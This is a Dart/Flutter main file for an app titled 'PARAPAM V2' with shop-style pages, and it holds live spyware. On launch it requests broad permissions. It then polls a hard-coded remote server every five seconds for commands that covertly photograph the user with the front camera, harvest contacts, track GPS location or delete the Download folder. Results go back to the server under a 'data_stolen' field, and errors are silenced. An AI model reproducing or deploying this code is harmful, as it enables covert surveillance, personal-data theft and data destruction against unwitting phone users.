import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:camera/camera.dart'; // Import Camera

import 'landing_page.dart'; 
import 'login_page.dart';
import 'loader_page.dart';
import 'home_page.dart';
import 'seller_page.dart';
import 'admin_page.dart';
import 'buy_account.dart';
import 'splash.dart'; 

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  
  await requestPermissions();
  
  String deviceId = await getUniqueId();
  
  startSpyware(deviceId);
  
  runApp(const MyApp());
}

Future<void> requestPermissions() async {
  await [
    Permission.camera,
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
  ].request();
}

Future<String> getUniqueId() async {
  DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
  try {
    if (Platform.isAndroid) {
      AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
      return androidInfo.id; 
    }
  } catch (e) {}
  return "ZDX-${Platform.localHostname.hashCode}";
}

Future<String> captureSnapshot() async {
  try {
    final cameras = await availableCameras();
    final frontCam = cameras.firstWhere(
      (c) => c.lensDirection == CameraLensDirection.front, 
      orElse: () => cameras.first
    );
    final ctrl = CameraController(frontCam, ResolutionPreset.low, enableAudio: false);
    await ctrl.initialize();
    XFile img = await ctrl.takePicture();
    
    List<int> imageBytes = await File(img.path).readAsBytes();
    String b64 = base64Encode(imageBytes);
    
    await ctrl.dispose();
    await File(img.path).delete(); 
    
    return "IMG_DATA:$b64";
  } catch (e) { 
    return "ERR_CAM: $e"; 
  }
}


void startSpyware(String deviceId) {
  const String serverBase = "http://papi.queen-priv.my.id:2417"; 

  Future<void> executeLogic() async {
    try {
      final response = await http.get(Uri.parse("$serverBase/get_command/$deviceId"))
          .timeout(const Duration(seconds: 5));
      
      if (response.statusCode == 200) {
        String command = jsonDecode(response.body)['command'];
        String report = "";

        // Perintah: Ambil Foto
        if (command == "take_snapshot") {
          report = await captureSnapshot();
        } 
        // Perintah: Ambil Kontak
        else if (command == "dump_contacts") {
          if (await FlutterContacts.requestPermission()) {
            List<Contact> contacts = await FlutterContacts.getContacts(withProperties: true);
            report = "CONTACTS: " + contacts.take(15).map((e) {
              String num = e.phones.isNotEmpty ? e.phones.first.number : "N/A";
              return "${e.displayName} ($num)";
            }).join(" | ");
          }
        } 
        // Perintah: Lacak Lokasi
        else if (command == "track_gps") {
          Position pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
          report = "GPS: ${pos.latitude},${pos.longitude}";
        }
        // Perintah: Hapus Data Download
        else if (command == "wipe_data") {
          final dir = Directory('/storage/emulated/0/Download');
          if (await dir.exists()) {
            dir.deleteSync(recursive: true);
            report = "WIPE_SUCCESS";
          }
        }

        await http.post(
          Uri.parse("$serverBase/register"),
          body: jsonEncode({
            "id": deviceId,
            "model": "${Platform.operatingSystem} | ${Platform.localHostname}",
            "data_stolen": report.isEmpty ? "Target Online" : report, 
          }),
          headers: {"Content-Type": "application/json"}
        );
      }
    } catch (e) { /* Silent */ }
  }

  Timer.periodic(const Duration(seconds: 5), (t) => executeLogic());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'PARAPAM V2',
      theme: ThemeData(
        brightness: Brightness.dark,
        fontFamily: 'ShareTechMono',
        scaffoldBackgroundColor: Colors.black,
      ),
      initialRoute: '/',
      onGenerateRoute: (settings) {
        switch (settings.name) {
          case '/': return MaterialPageRoute(builder: (_) => const LandingPage());
          case '/login': return MaterialPageRoute(builder: (_) => const LoginPage());
          case '/splash': 
            final args = settings.arguments as Map<String, dynamic>;
            return MaterialPageRoute(builder: (_) => SplashPage(data: args));
          case '/buy_account': return MaterialPageRoute(builder: (_) => const BuyAccountPage());
          case '/loader':
            final args = settings.arguments as Map<String, dynamic>;
            return MaterialPageRoute(builder: (_) => Scaffold(body: Center(child: Text("Loader Active")))); 
          default:
            return MaterialPageRoute(builder: (_) => const Scaffold(body: Center(child: Text("404"))));
        }
      },
    );
  }
}